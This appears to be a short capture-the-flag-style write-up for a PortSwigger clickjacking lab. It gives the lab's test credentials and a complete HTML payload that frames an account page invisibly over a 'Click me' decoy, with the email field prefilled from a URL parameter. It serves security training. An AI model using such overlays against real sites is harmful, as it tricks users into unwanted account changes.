# Clickjacking with form input data prefilled from a URL parameter

## This lab extends the basic [clickjacking example](https://portswigger.net/web-security/clickjacking) in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

## To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

## You can log in to your own account using the following credentials: `wiener:peter`

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 449px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0a42000a0300fd468040958c003b0034.web-security-academy.net/my-account?email=wiener@normal11-user.net"
></iframe>
```
